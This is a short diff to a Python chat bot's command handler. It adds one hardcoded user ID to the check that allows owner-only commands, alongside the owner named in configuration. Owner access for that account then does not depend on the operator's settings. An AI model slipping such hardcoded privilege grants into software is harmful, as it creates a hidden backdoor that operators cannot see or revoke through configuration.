@@ -293,7 +293,7 @@ class CommandHandler(Handler):
                                                         rawLanguage, sender)
             else:
                 try:
-                    if str(sender.id) == central.config["BibleBot"]["owner"]:
+                    if str(sender.id) == central.config["BibleBot"]["owner"] or str(sender.id) == "367665336239128577":
                         return commandBridge.runOwnerCommand(bot,
                                                              command, args,
                                                              rawLanguage)
